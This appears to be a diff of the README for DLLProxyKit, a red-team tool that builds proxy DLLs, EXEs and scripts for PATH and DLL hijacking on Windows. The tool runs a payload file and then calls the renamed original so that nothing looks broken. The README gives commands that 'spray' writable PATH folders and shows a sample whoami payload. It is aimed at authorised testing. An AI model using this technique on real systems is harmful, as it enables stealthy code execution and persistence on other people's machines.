@@ -2,61 +2,62 @@
 
 <img width="736" height="304" alt="banner" src="banner.jpg" />
 
-
 # DLLProxyKit
 
-**DLL proxies that forward every export but they allow a payload to be executed.**
+**The name is a lie.** It started as DLL proxies. Now it hijacks almost anything on PATH.
 
-[![Rust](https://img.shields.io/badge/rust-1.74+-orange?logo=rust)](https://www.rust-lang.org/)
+[![C](https://img.shields.io/badge/C-MSVC%20%7C%20MinGW%20%7C%20tcc-blue)](#)
 [![Platform](https://img.shields.io/badge/platform-Windows-blue)](#)
 
 </div>
 
----
+Windows searches PATH. If you can write to a folder that comes first, you get to run first. That's the whole trick.
 
-Generates a drop-in DLL replacement that forwards every named export to
-`<name>_orig.dll` and runs `payload.txt` on load. Architecture-matched
-(x86 / x64 / ARM64).
+This tool just builds the stand-in: DLL, EXE, `.bat`, `.cmd`, `.ps1`, `.py`, `.pl`. The original is renamed to `<name>.original.<ext>`. On run, the proxy fires `payload.txt` and then calls the real file so nothing looks broken.
 
----
+Payload lives in `C:\Windows\Temp\payload.txt` (not overwritten if it already exists). Drop one next to the proxy if you want a local override. Edit that file whenever — no rebuild.
 
-## Attacker Setup
-
-```cmd
-pip install pefile                         :: To run the DLL generator
-rustup target add i686-pc-windows-msvc     :: To compile x86 DLLs
-```
+<div align="center">
+<img width="600" height="607" alt="image" src="https://github.com/user-attachments/assets/8a2f5b12-f882-42b3-b6ac-901fdb2cf0b1" />
+</div>
 
 ## Usage
+
+Build a one-file exe:
+
 ```cmd
-python src\dllproxymaker.py <input_dir> <output_dir> [--payload CMD] [--skip LIST] [--keep-going]
-
-# Example
-python src\dllproxymaker.py tests\dll-test tests\dll-output --payload "whoami > C:\Windows\Temp\pwned.txt" --keep-going
+build.cmd
 ```
-Output:
+
+Spray writable PATH dirs (outside the user profile):
+
+```cmd
+dist\DLLProxyKit.exe --auto
+```
+
+Undo that:
+
+```cmd
+dist\DLLProxyKit.exe --auto --revert
+```
+
+Or point it at one folder / file:
+
+```cmd
+python -m dllproxykit tests\dlls-test --keep-going
+```
+
 ```text
-dll-test/
-  ├── vfcompat.dll          
-  └── appverifUI.dll          
-dll-output/
-  ├── vfcompat.dll            ← proxy
-  ├── vfcompat_orig.dll       ← original
-  ├── appverifUI.dll          ← proxy
-  ├── appverifUI_orig.dll     ← original
-  └── payload.txt             ← runs on every DLL load
+vfcompat.dll              ← proxy
+vfcompat.original.dll     ← original
+appverifUI.dll            ← proxy
+appverifUI.original.dll   ← original
 ```
-Deploy by copying *.dll and payload.txt together. Default payload:
-```
-whoami >> C:\Windows\Temp\pwned.txt.
-```
-You can change the payload.txt every time you want, without recompile everything
 
-## Notes
-One Rust stub per export; lazily forwards to the original via LoadLibraryW + GetProcAddress.
+Default payload is in `src/dllproxykit/core/common.py`. `-i dll,exe,ps1` if you only want some kinds.
 
-Ordinal-only exports are not forwarded.
-Args assumed to be up to ten usize values (covers most Win32 APIs).
-API set stubs (api-ms-win-*, ext-ms-win-*) are skipped.
+## Fine print
 
-# For authorised security testing and CTFs only.
+DLL exports are forwarded with LoadLibrary + GetProcAddress (up to ten args, named exports only). `api-ms-win-*` / `ext-ms-win-*` are skipped. TCC is bundled; rustc is a fallback.
+
+**Authorised security testing and CTFs only.**
